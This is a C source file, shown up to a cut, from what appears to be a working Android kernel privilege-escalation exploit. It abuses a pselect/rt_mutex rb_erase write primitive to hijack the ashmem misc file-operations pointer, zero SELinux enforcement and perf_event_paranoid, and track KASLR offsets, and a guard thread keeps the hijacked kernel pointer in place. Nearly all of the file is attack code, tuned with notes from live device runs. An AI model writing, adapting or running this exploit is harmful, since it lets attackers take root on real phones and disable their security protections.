#include "common.h"

#include <poll.h>

#ifndef PSELECT_CFI_ROUTE_ATTEMPTS
#define PSELECT_CFI_ROUTE_ATTEMPTS 24
#endif
#ifndef PSELECT_CFI_REPREPARE_EVERY
#define PSELECT_CFI_REPREPARE_EVERY 1
#endif

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

/*
 * Third-party root processes open /dev/ashmem while misc.fops is hijacked;
 * a clobbered misc.fops pointer (observed as 0xfffffb13ba2a000 with
 * owner=0x10) crashes them in try_module_get during the physrw window.
 * g_fops_probe_fd is a long-lived dup of the hijacked cfi fd (its f_op
 * snapshot keeps configfs rw working regardless of misc.fops), and the
 * guard thread pins misc.fops back to fops_guard_expect within ~1ms.
 */
int g_fops_probe_fd = -1;
static atomic_int fops_guard_started;
static atomic_uintptr_t fops_guard_expect;
/*
 * What misc.fops is expected to contain after the route lands.  Equals
 * fake_fops unless KS_PSELECT_FOPS_VOFF shifted the written value (1-byte
 * content/pointer compensation).  CFI pre-check, guard and slot refresh
 * must all agree on THIS, not on the unshifted table origin.
 */
uintptr_t expected_misc_fops;

static uintptr_t route_expected_fops(void) {
  if (expected_misc_fops)
    return expected_misc_fops;
  return fake_fops;
}

void fops_guard_set_expect(uintptr_t expect) {
  uintptr_t prev = atomic_exchange(&fops_guard_expect, expect);
  if (prev != expect) {
    pr_info("misc.fops guard expect %016zx -> %016zx\n", prev, expect);
  }
}

uintptr_t fops_guard_get_expect(void) {
  return atomic_load(&fops_guard_expect);
}

static void *fops_guard_thread(void *arg __attribute__((unused))) {
  prctl(PR_SET_NAME, "fops_guard", 0, 0, 0);
  pr_info("fops guard thread start tid=%ld\n", (long)syscall(SYS_gettid));
  uintptr_t last_bad = 0;
  int bad_count = 0;
  int read_fail = 0;
  for (;;) {
    uintptr_t expect = atomic_load(&fops_guard_expect);
    if (expect && g_fops_probe_fd >= 0) {
      uint64_t cur = 0;
      ssize_t n = configfs_read_once_quiet(
          g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &cur, 8);
      if (n != 8) {
        read_fail++;
        if (read_fail == 1 || (read_fail % 2000) == 0) {
          pr_warning("fops guard read fail n=%zd errno=%d count=%d expect=%016zx\n",
                     n, errno, read_fail, expect);
        }
        /*
         * fix62 blind restore: the read half is dead but a write window may
         * still twitch open (transient ENOTTY family, fix56 kin).  While
         * the chain runs, expect is the fake table -- blind-writing it
         * re-asserts our route; once the fail path flips expect to the
         * canonical REAL table (close_fake_fops_probe_fd containment),
         * this same write defuses the third-party misc_open landmine the
         * moment the channel recovers.  A dead channel just returns a
         * harmless ENOTTY; rate-limited to every 500th failed read.
         */
        if ((read_fail % 500) == 0) {
          ssize_t w = configfs_write_once(
              g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &expect, 8);
          pr_warning("fops guard blind restore ret=%zd errno=%d expect=%016zx\n",
                     w, errno, expect);
        }
      } else {
        read_fail = 0;
        if ((uintptr_t)cur != expect) {
          bad_count++;
          if ((uintptr_t)cur != last_bad || (bad_count % 200) == 1) {
            pr_warning("misc.fops clobber #%d got=%016llx expect=%016zx; "
                       "restoring\n",
                       bad_count, (unsigned long long)cur, expect);
          }
          last_bad = (uintptr_t)cur;
          ssize_t w = configfs_write_once(
              g_fops_probe_fd, text_addr(ASHMEM_MISC_FOPS), &expect, 8);
          if (w != 8) {
            pr_warning("misc.fops guard write ret=%zd errno=%d\n", w, errno);
          }
        }
      }
    }
    usleep(expect ? 1000 : 10000);
  }
  return NULL;
}

void fops_guard_start(void) {
  if (atomic_exchange(&fops_guard_started, 1)) {
    return;
  }
  pthread_t th;
  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
  if (pthread_create(&th, &attr, fops_guard_thread, NULL) != 0) {
    pr_warning("fops guard thread create failed errno=%d\n", errno);
    atomic_store(&fops_guard_started, 0);
  }
  pthread_attr_destroy(&attr);
}

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_runtime_shift(void) {
  static int cached = -1;
  if (cached >= 0) {
    return cached;
  }
  cached = PSELECT_WAITER_WORD_SHIFT;
  const char *env = getenv("KS_PSELECT_SHIFT");
  if (env && env[0]) {
    char *end = NULL;
    long v = strtol(env, &end, 0);
    if (end && *end == '\0' && v >= -32 && v <= 64) {
      cached = (int)v;
    } else {
      pr_warning("bad KS_PSELECT_SHIFT value=%s; using %d\n", env,
                 PSELECT_WAITER_WORD_SHIFT);
    }
  }
  return cached;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_runtime_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

static int pselect_simple_layout(void) {
  const char *env = getenv("PSELECT_SIMPLE_LAYOUT");
  if (env && env[0]) {
    return strcmp(env, "0") != 0 && strcasecmp(env, "false") != 0 &&
           strcasecmp(env, "no") != 0;
  }

#ifdef PSELECT_USE_SHIFTED_LAYOUT
  /* Target's pselect/futex stack geometry puts the stale waiter S.tree
   * exactly at the shifted waiter-word array's word-2 base, so the shifted
   * layout is required even though PSELECT_WAITER_WORD_SHIFT is 0.  The
   * legacy rule below (shift==0 -> simple) would place S.tree at word0 and
   * misalign every waiter field by 2 qwords (PI-chain garbage family). */
  return 0;
#else
  /*
   * rodin's proven route used the legacy compact fdset shape.  Targets with
   * non-zero generated stack overlap need the shifted waiter-word layout.
   */
  return PSELECT_WAITER_WORD_SHIFT == 0;
#endif
}

static int pselect_probe_mode(void) {
  const char *env = getenv("KS_PSELECT_PROBE");
  if (env && env[0]) {
    return strcmp(env, "0") != 0 && strcasecmp(env, "false") != 0 &&
           strcasecmp(env, "no") != 0;
  }
  return 0;
}

static int pselect_rw_peer = -1;
/*
 * The paranoid probe must never reuse a lock slot.  Attempt 1 starts with
 * waiters.rb_leftmost == 0 and writes *target; attempt 2 re-entering
 * rt_mutex_adjust_prio_chain against that same lock sees rb_leftmost == S
 * and ends at the rtmutex_common.h BUG.  A fresh zeroed slot per attempt
 * avoids that, so a failed attempt (target unchanged, therefore rb_erase
 * never ran, therefore the slot is still pristine) is simply retried.
 */
static int pselect_paranoid_probe;
/* Which route_attempt the next prepare_pselect_fdsets() belongs to. */
static int pselect_attempt_idx;
/*
 * A slot lives in .bss and survives every userspace process, so it can only
 * be used once per boot: rb_erase() leaves waiters.rb_leftmost dirty and
 * re-entering rt_mutex_adjust_prio_chain against it hits the
 * rtmutex_common.h BUG (kernel_panic,bug).  Misses leave the slot pristine
 * (the target store is what dirties it and an unchanged target proves it
 * never ran), so only a hit has to be remembered -- in a mask scoped to the
 * current boot, because a reboot re-zeroes .bss.
 */
#define PSELECT_SLOT_FILE "/data/local/tmp/.ks_lock_slots"
static unsigned int pselect_slot_mask;
static int pselect_lock_base;
static int pselect_attempt_slot;
static int pselect_slot_is_paranoid;
static int pselect_bss_lock;
/*
 * Set only when the dirty-slot mask is provably scoped to this boot.  When
 * it is 0 we cannot tell whether a slot in .bss was dirtied by an earlier
 * process, so attempting the route at all risks the rtmutex BUG.
 */
static int pselect_slot_tracking_ok;

static void pselect_boot_id(char *out, size_t n) {
  out[0] = 0;
  FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
  if (!f) return;
  char id[80];
  if (fgets(id, sizeof(id), f)) {
    size_t j = 0;
    for (size_t i = 0; id[i] && j + 1 < n; i++) {
      if (id[i] != '-' && id[i] != '\n') out[j++] = id[i];
    }
    out[j] = 0;
  }
  fclose(f);
}

/*
 * Slots 0..15 start at the proven address and run up to the pad limit;
 * slots 16..31 fill the lower half of the same pad.  Both halves stay
 * inside the 0x600-byte zeroed gap between __bss_start and selinux_state.
 */
static uint64_t pselect_slot_offset(int slot) {
  int half = BSS_LOCK_SLOTS / 2;
  if (slot < half) {
    return BSS_LOCK_PAD_OFF + (uint64_t)slot * BSS_LOCK_SLOT_SIZE;
  }
  return BSS_LOCK_PAD_OFF - (uint64_t)half * BSS_LOCK_SLOT_SIZE +
         (uint64_t)(slot - half) * BSS_LOCK_SLOT_SIZE;
}

static int pselect_slot_write(unsigned int mask) {
  char boot[80];
  pselect_boot_id(boot, sizeof(boot));
  FILE *sf = fopen(PSELECT_SLOT_FILE, "w");
  if (!sf) return -1;
  fprintf(sf, "%s %u\n", boot, mask);
  fclose(sf);
  /*
   * World-writable: if root creates this file0644 (umask), a later run as
   * adb shell can read it but every burn silently fails to persist -> the
   * next shell process reuses a dirty .bss slot whose rb waiter points
   * into a freed kernel stack -> panic. Root bypasses the mode anyway.
   */
  if (chmod(PSELECT_SLOT_FILE, 0666) != 0)
    pr_warning("pselect chmod slot file errno=%d\n", errno);
  return 0;
}

/*
 * The file is the only record of which .bss slots this boot already burnt.
 * Three invariants make mask=0 trustworthy when it is returned:
 *   - no file   => no process has ever run the paranoid route this boot,
 *                  because running it always claims the file first;
 *   - foreign boot id => the file describes a previous boot, and a reboot
 *                  re-zeroes .bss, so every slot is clean again;
 *   - matching boot id => the mask was parsed and applies to this boot.
 * Anything else (this boot's file that we cannot parse) means slots may be
 * dirty without us knowing, so we refuse to run rather than gamble.
 */
static void pselect_load_slot_mask(void) {
  char boot[80], file_boot[80];
  unsigned int mask = 0;
  pselect_boot_id(boot, sizeof(boot));
  pselect_slot_tracking_ok = 0;
  if (strlen(boot) != 32) {
    pr_error("pselect cannot read boot_id; dirty-slot mask is unscoped, "
             "refusing to reuse .bss lock slots\n");
    return;
  }

  FILE *sf = fopen(PSELECT_SLOT_FILE, "r");
  if (!sf) {
    pselect_slot_mask = 0;
    if (pselect_slot_write(0) != 0) {
      pr_warning("pselect cannot claim %s; a later process may reuse a "
                 "dirty slot\n", PSELECT_SLOT_FILE);
      return; /* tracking_ok stays 0 -> route refuses to run */
    }
    pselect_slot_tracking_ok = 1;
  } else {
    char raw[96];
    size_t got = fread(raw, 1, sizeof(raw) - 1, sf);
    fclose(sf);
    raw[got] = 0;
    int n = sscanf(raw, "%79s %u", file_boot, &mask);
    if (n != 2) {
      /*
       * Crash artifact (observed after the fix41 panic-reboot): the file
       * kept its byte length but every byte is NUL -- the short write
       * lived only in page cache and f2fs zeroed it during recovery.
       * A lost write implies a kernel panic, and every panic reboots,
       * which re-zeroes .bss; therefore an all-NUL/unparseable file
       * cannot be hiding a dirty slot in THIS boot.  Reclaim it.
       * Partial-ASCII garbage (first byte non-NUL) is NOT explained by
       * that argument (could be a same-boot crash mid-write) and still
       * refuses.
       */
      /* got == 0 (empty file) is the same evidence as all-NUL: burns are
       * only ever run after pselect_slot_write() succeeds, so an empty
       * file cannot be hiding a dirty slot in THIS boot -- an external
       * truncate (e.g. host-side cleanup) zeroes the mask exactly like
       * the f2fs crash-artifact path below. */
      int all_nul = 1;
      for (size_t i = 0; i < got; i++) {
        if (raw[i] != 0) { all_nul = 0; break; }
      }
      if (all_nul) {
        pr_warning("pselect slot file is a zeroed crash artifact; "
                   "reclaiming with mask=0\n");
        pselect_slot_mask = 0;
        if (pselect_slot_write(0) != 0) {
          pr_warning("pselect cannot claim %s; a later process may reuse a "
                     "dirty slot\n", PSELECT_SLOT_FILE);
          return;
        }
        pselect_slot_tracking_ok = 1;
        goto slot_mask_done;
      } else {
        pselect_slot_mask = 0;
        pr_error("pselect slot mask file unreadable for boot %s; refusing "
                 "to guess which .bss slots are dirty\n", boot);
        return;
      }
    } else if (strlen(file_boot) == 32 && strcmp(file_boot, boot) == 0) {
      pselect_slot_mask = mask;
      /*
       * Prove we can persist future burns BEFORE running: a same-boot file
       * we can read but not write (root-owned, we are shell) would let this
       * process burn slots silently and the NEXT process reuse one -> the
       * reused rb waiter points into this process's freed kernel stack and
       * the kernel oopses (observed: rt_mutex_adjust_prio_chain paging
       * request on a pte=0 stack page).
       */
      if (pselect_slot_write(mask) != 0) {
        pr_warning("pselect cannot update %s; dirty slots would be lost, "
                   "refusing to run\n", PSELECT_SLOT_FILE);
        return;
      }
      pselect_slot_tracking_ok = 1;
    } else if (n == 2) {
      /* previous boot: .bss is clean again, claim this one */
      pselect_slot_mask = 0;
      if (pselect_slot_write(0) != 0) {
        pr_warning("pselect cannot claim %s; a later process may reuse a "
                   "dirty slot\n", PSELECT_SLOT_FILE);
        return;
      }
      pselect_slot_tracking_ok = 1;
    } else {
      pselect_slot_mask = 0;
      pr_error("pselect slot mask file unreadable for boot %s; refusing to "
               "guess which .bss slots are dirty\n", boot);
      return;
    }
  }

slot_mask_done:
  pselect_lock_base = 0;
  for (int i = 0; i < BSS_LOCK_SLOTS; i++) {
    if (!(pselect_slot_mask & (1u << i))) {
      pselect_lock_base = i;
      break;
    }
  }
  const char *override = getenv("KS_PSELECT_LOCK_BASE");
  if (override && override[0]) {
    pselect_lock_base = atoi(override);
    pselect_slot_mask = 0;
  }
  if (pselect_slot_mask) {
    pr_info("pselect dirty lock slots mask=%x starting at slot=%d\n",
            pselect_slot_mask, pselect_lock_base);
  }
}

/*
 * Mirror do_pselect's ledger flag computation so the slot mask can be
 * validated BEFORE the PI threads exist.  A corrupt ledger makes
 * pselect_load_slot_mask() pr_error->exit(-1); taken pre-arm that exit is
 * harmless, while the same exit from the waiter thread after arming spins
 * the kernel in rt_mutex teardown (device watchdog-reboots ~20s later).
 */
void pselect_route_preflight(void) {
  const char *tgt = getenv("KS_PSELECT_TARGET");
  int paranoid = tgt && strcmp(tgt, "paranoid") == 0;
  const char *bl = getenv("KS_PSELECT_BSS_LOCK");
  int bss_lock = bl && bl[0] && strcmp(bl, "0") != 0 &&
                 strcasecmp(bl, "false") != 0 && strcasecmp(bl, "no") != 0;
  if (paranoid || bss_lock) pselect_load_slot_mask();
}

static int pselect_clean_slot(int attempt) {
  int slot = (pselect_lock_base + attempt) % BSS_LOCK_SLOTS;
  for (int k = 0; k < BSS_LOCK_SLOTS; k++) {
    if (!(pselect_slot_mask & (1u << slot))) return slot;
    slot = (slot + 1) % BSS_LOCK_SLOTS;
  }
  return -1;
}

static void pselect_mark_slot_dirty(int slot) {
  if (slot < 0 || slot >= BSS_LOCK_SLOTS) return;
  pselect_slot_mask |= 1u << slot;
  if (pselect_slot_write(pselect_slot_mask) != 0) {
    pr_warning("pselect cannot persist dirty slot mask (slot %d stays "
               "unusable for the rest of this boot)\n", slot);
    /* Cannot record the burn: drop tracking so the attempt loop refuses
     * (pr_error) instead of burning more slots nobody will know about. */
    pselect_slot_tracking_ok = 0;
  }
}

void pselect_close_rw_peer(void) {
  if (pselect_rw_peer >= 0) {
    close(pselect_rw_peer);
    pselect_rw_peer = -1;
  }
}

/*
 * Zero the fake rt_mutex slot in .bss before the waiter thread exits.
 * rb_erase() leaves waiters.rb_node (+0x08) and waiters.rb_leftmost (+0x10)
 * pointing into the waiter's kernel stack; freeing that stack then lets the
 * next walker of the (seemingly live) rb tree oops -> panic.  Called after
 * requeue_pi has returned (errno=110) and pi_blocked_on is confirmed clear,
 * so the kernel is no longer using the tree from the waiter side.
 *
 * Uses the cfgfs write path: the slot lives at KIMAGE_TEXT_BASE (kernel
 * image mapping), outside the physmap window that pipe_phys_write_data's
 * is_direct_ptr() gate accepts.
 */
int pselect_scrub_slot(int fd) {
  if (pselect_attempt_slot < 0) return 1;
  /* physmap alias: pipe_phys_write_data gates on is_direct_ptr(). */
  uint64_t lock = data_addr(
      KIMAGE_TEXT_BASE + pselect_slot_offset(pselect_attempt_slot));
  if (!is_direct_ptr(lock)) {
    pr_warning("pselect scrub lock %llx not a direct ptr\n",
               (unsigned long long)lock);
    return 0;
  }
  /*
   * Pipe primitive first (the root-phase caller has it), cfgfs fallback
   * for the early call site in install_child_root: the pipe reclaim has
   * NOT run yet there, but the hijacked configfs deputy already writes
   * any kernel address through this same fd.  The scrub must be able to
   * land before physrw's storm (see install_child_root).
   */
  for (unsigned off = 0; off < BSS_LOCK_SLOT_SIZE; off += 8) {
    uint64_t zero = 0;
    ssize_t wr = pipe_write64(fd, lock + off, 0);
    if (!wr) {
      wr = configfs_write_once(fd, lock + off, &zero, 8);
      if (wr != (ssize_t)sizeof(zero)) {
        pr_warning("pselect scrub write failed slot=%d off=%x rv=%zd\n",
                   pselect_attempt_slot, off, wr);
        return 0;
      }
    }
  }
  /* Verify through cfgfs: readable in both the early (pre-pipe) and the
   * root-phase calling contexts. */
  uint64_t rb_node = 0, rb_left = 0;
  if (configfs_read_once(fd, lock + 8, &rb_node, 8) != 8 ||
      configfs_read_once(fd, lock + 0x10, &rb_left, 8) != 8) {
    pr_warning("pselect scrub verify read failed slot=%d\n",
               pselect_attempt_slot);
    return 0;
  }
  if (rb_node || rb_left) {
    pr_warning("pselect scrub verify slot=%d rb_node=%llx rb_leftmost=%llx\n",
               pselect_attempt_slot, (unsigned long long)rb_node,
               (unsigned long long)rb_left);
    return 0;
  }
  pr_info("pselect scrubbed dirty slot=%d lock=%llx\n", pselect_attempt_slot,
          (unsigned long long)lock);
  return 1;
}

static int pselect_poll_is_rw(const int fd) {
  struct pollfd pfd;
  memset(&pfd, 0, sizeof(pfd));
  pfd.fd = fd;
  pfd.events = POLLIN | POLLOUT | POLLPRI;
  if (poll(&pfd, 1, 0) != 1) {
    return 0;
  }
  if (!(pfd.revents & POLLIN) || !(pfd.revents & POLLOUT)) {
    return 0;
  }
  if (pfd.revents & (POLLPRI | POLLERR | POLLHUP | POLLNVAL)) {
    return 0;
  }
  return 1;
}

/*
 * Returns an fd whose poll() reports POLLIN|POLLOUT and nothing else, so a
 * single dup2() source satisfies both the in[] and the out[] direction of a
 * planted fd.  Both ends are lifted above PSELECT_ROUTE_NFDS first: the fill
 * loop dup2()s over fd 0..319, so a rw fd (or its peer) living in that range
 * would be clobbered or closed mid-loop.  The caller keeps the peer alive
 * (pselect_close_rw_peer) until pselect() has returned.
 */
static int pselect_rw_fd(void) {
  pselect_close_rw_peer();

  int base = PSELECT_ROUTE_NFDS + 32;

  int sv[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
    char byte = 'X';
    int wrote = (write(sv[1], &byte, 1) == 1);
    int r = fcntl(sv[0], F_DUPFD, base);
    int p = fcntl(sv[1], F_DUPFD, base + 1);
    close(sv[0]);
    close(sv[1]);
    if (wrote && r >= 0 && p >= 0 && pselect_poll_is_rw(r)) {
      pselect_rw_peer = p;
      return r;
    }
    if (r >= 0) {
      close(r);
    }
    if (p >= 0) {
      close(p);
    }
  }

  int null_fd = open("/dev/null", O_RDWR);
  if (null_fd >= 0) {
    int r = fcntl(null_fd, F_DUPFD, base);
    close(null_fd);
    if (r >= 0 && pselect_poll_is_rw(r)) {
      return r;
    }
    if (r >= 0) {
      close(r);
    }
  }

  pr_warning("pselect no rw fd socketpair/null unusable\n");
  return -1;
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  const char *dbg = getenv("KS_PSELECT_DEBUG_FILL");
  int debug_fill = dbg && dbg[0] && strcmp(dbg, "0") != 0 &&
                   strcasecmp(dbg, "false") != 0 && strcasecmp(dbg, "no") != 0;

  /*
   * The kernel overwrites the planted waiter with res = input & ready
   * (core_sys_select copies the result bitmaps back over the fd_set it
   * polled), so every bit we plant must be satisfied by an fd that is ready
   * for exactly that direction.  A fd can only hold one file, so an fd that
   * is set in both in[] and out[] cannot be a pipe read end (never writable)
   * nor a pipe write end (never readable): its res_in bit would be dropped
   * and the planted word silently corrupted.  Feed every selected fd the same
   * fd that is ready for read AND write and carries no EPOLLPRI (so the ex
   * words stay zero), which makes res == input for in[] and out[].
   */
  int rw_fd = pselect_rw_fd();
  if (rw_fd >= 0) {
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
      if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
        dup2(rw_fd, fd);
      }
    }
    close(rw_fd);
    dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
    FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    return;
  }

  int dup_in = -1;
  int dup_out = -1;
  if (debug_fill) {
    dup_in = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
    if (dup_in < 0) {
      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
      return;
    }
    dup_out = dup_in;
  } else {
    dup_in = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
    dup_out = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 33);
    if (dup_in < 0 || dup_out < 0) {
      pr_warning("pselect F_DUPFD pipe in=%d out=%d errno=%d\n", dup_in,
                 dup_out, errno);
      if (dup_in >= 0) {
        close(dup_in);
      }
      if (dup_out >= 0 && dup_out != dup_in) {
        close(dup_out);
      }
      return;
    }
  }

  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    int src = -1;
    if (FD_ISSET(fd, in) || FD_ISSET(fd, ex)) {
      src = dup_in;
    }
    if (FD_ISSET(fd, out)) {
      src = dup_out;
    }
    if (src >= 0) {
      dup2(src, fd);
    }
  }
  if (dup_out != dup_in) {
    close(dup_out);
  }
  close(dup_in);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int pselect_ready_counts(fd_set *in, fd_set *out, fd_set *ex, int *in_bits,
                                int *out_bits, int *ex_bits) {
  int a = 0, b = 0, c = 0;
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in)) {
      a++;
    }
    if (FD_ISSET(fd, out)) {
      b++;
    }
    if (FD_ISSET(fd, ex)) {
      c++;
    }
  }
  *in_bits = a;
  *out_bits = b;
  *ex_bits = c;
  return a + b + c;
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  const char *dbg = getenv("KS_PSELECT_DEBUG_FILL");
  if (dbg && dbg[0] && strcmp(dbg, "0") != 0 && strcasecmp(dbg, "false") != 0 &&
      strcasecmp(dbg, "no") != 0) {
    int wps = pselect_words_per_set();
    int total = wps * 3;
    for (int g = 0; g < total; g++) {
      uint64_t magic = ((uint64_t)(g & 0xff) << 8) | 0x5;
      pselect_put_global_word(in, out, ex, wps, g, magic);
    }
    pr_info("pselect debug fill words=%d\n", total);
    return;
  }

  if (pselect_simple_layout()) {
    int wps = pselect_words_per_set();
    int sh = pselect_runtime_shift();
    /*
     * rt_mutex_adjust_prio_chain ends in rb_erase() on the stale waiter S
     * that p->pi_blocked_on still points at.  rb_erase takes the "no left
     * child" arm when word2 (S->tree_entry.rb_left) is 0 and then calls
     * __rb_change_child(S, word1, parent=word0, root), which stores word1
     * into parent->rb_right when parent->rb_left != S.  With word0 = target-8
     * parent->rb_right lands exactly on target, so *target = word1.  The pi
     * tree (words 3..5) is planted identically because the chain also walks
     * task->pi_waiters through S->pi_tree_entry.
     *
     * Both trees must be planted: this branch previously only wrote
     * task/lock/prio, leaving every rb link zero, so nothing could ever be
     * written to ASHMEM_MISC_FOPS.
     */
    uintptr_t target = text_addr(ASHMEM_MISC_FOPS);
    uintptr_t value = fake_fops;
    /*
     * Where skb_buf actually lands in the kernel relative to the leaked
     * mm_struct page (SKB_DATA_DELTA) is the last unknown: a wrong guess
     * makes misc_open() jump through a garbage ->open.  Let the harness aim
     * the written fops pointer at a different slice of the payload page.
     */
    const char *fo = getenv("KS_PSELECT_FOPS_VOFF");
    if (fo && fo[0]) {
      uintptr_t voff = strtoull(fo, NULL, 0);
      uintptr_t v = fake_fops + voff;
      if (is_kernel_ptr(v)) {
        value = v;
        fops_voff = voff;
        pr_info("pselect fops value=%016llx (fake=%016zx + %s)\n",
                (unsigned long long)value, fake_fops, fo);
      } else {
        pr_error("KS_PSELECT_FOPS_VOFF not a kernel pointer; keeping fake_fops\n");
      }
    }
    /* Publish for CFI pre-check / guard / refresh.
     * boot6 evidence: VOFF=+1 → open fd=65 + cfgfs rd=8 both succeed, so the
     * kernel IS calling through our fake fops at table+1. Content is +1
     * shifted (kernel reads open from table+1+0x70 = table+0x71 which holds
     * the correct pointer). Stored misc.fops = value = table+1.
     * fake_fops MUST stay as the table base for all content accesses
     * (ks_fetch64(fake_fops + FOPS_*_OFF)); only value/expected use +VOFF. */
    expected_misc_fops = value;
    /* fake_fops unchanged: remains the aligned table base. */
    /*
     * Bootstrap test hook: force `value` (rb_erase's child, i.e. the qword
     * written to *target, and also the address rb_erase writes back into)
     * to an explicit kernel address so we can probe whether a given
     * mapping is writable without guessing payload layout.
     *   KS_PSELECT_VALUE=<img>  -> data_addr(img)  (physmap alias)
     *   KS_PSELECT_VALUE=text:<img> -> text_addr(img)
     *   KS_PSELECT_VALUE=<abs pointer> -> used verbatim
     */
    const char *vo = getenv("KS_PSELECT_VALUE");
    if (vo && vo[0]) {
      uintptr_t v;
      if (!strncmp(vo, "text:", 5)) {
        v = text_addr(strtoull(vo + 5, NULL, 0));
      } else if (!strncmp(vo, "abs:", 4)) {
        v = strtoull(vo + 4, NULL, 0);
      } else {
        v = data_addr(strtoull(vo, NULL, 0));
      }
      if (is_kernel_ptr(v)) {
        value = v;
        pr_info("pselect value override %s -> %016llx target=%016zx\n", vo,
                (unsigned long long)value, target);
      } else {
        pr_error("KS_PSELECT_VALUE not a kernel pointer\n");
      }
    }
    const char *tgt = getenv("KS_PSELECT_TARGET");
    if (tgt && strcmp(tgt, "readiter") == 0) {
      target = text_addr(ASHMEM_FOPS) + FOPS_READ_ITER_OFF;
      value = 0;
      pr_info("pselect target=readiter zero %016zx\n", target);
    } else if (tgt && strcmp(tgt, "selinux") == 0) {
      /*
       * SELINUX_ENFORCING is at selinux_state+1 (CONFIG_SECURITY_SELINUX_DISABLE
       * puts `disabling` at +0).  rb_erase's parent->rb_right store goes through
       * __rb_parent which masks the low 2 bits, so the write address is always
       * 4-byte aligned — an odd target makes the store land at target-1 and the
       * write silently misses.  Aim at the even base instead: an 8-byte zero
       * store covers disabling(+0) and enforcing(+1) together.
       */
      target = text_addr(SELINUX_ENFORCING) - 1;
      value = 0;
      pr_info("pselect target=selinux base zero %016zx (enforcing at +1)\n",
              target);
    } else if (tgt && strcmp(tgt, "paranoid") == 0) {
      /*
       * Shell-observable write probe.  value MUST be 0: rb_erase writes
       * child->__rb_parent_color = parent at address `value`, so a non-zero
       * value would be dereferenced as a pointer.  value 0 clears
       * sysctl_perf_event_paranoid (int at PERF_EVENT_PARANOID_OFF) and
       * sysctl_perf_event_mlock (the int right after it).
       */
      int before = -99, mlock = -99;
      FILE *pf = fopen("/proc/sys/kernel/perf_event_paranoid", "r");
      if (pf) {
        if (fscanf(pf, "%d", &before) != 1) before = -99;
        fclose(pf);
      }
      FILE *mf = fopen("/proc/sys/kernel/perf_event_mlock_kb", "r");
      if (mf) {
        if (fscanf(mf, "%d", &mlock) != 1) mlock = -99;
        fclose(mf);
      }
      /* Must be the kernel-image VA: rb_erase dereferences parent/target
       * through the kernel page tables.  data_addr() yields the __va() alias
       * of the *unslid* physical address, which is not mapped here. */
      target = text_addr(KIMAGE_TEXT_BASE + PERF_EVENT_PARANOID_OFF);
      value = 0;
      /* KS_PSELECT_VALUE lets a harness write something other than 0 (e.g.
       * 0x204ffffffff restores paranoid=-1 and mlock_kb=516) so the probe
       * can be re-run on the same boot without rebooting. */
      const char *ve = getenv("KS_PSELECT_VALUE");
      if (ve && ve[0]) {
        uint64_t v = strtoull(ve, NULL, 0);
        /* rb_erase() stores node->rb_right into the target AND then does
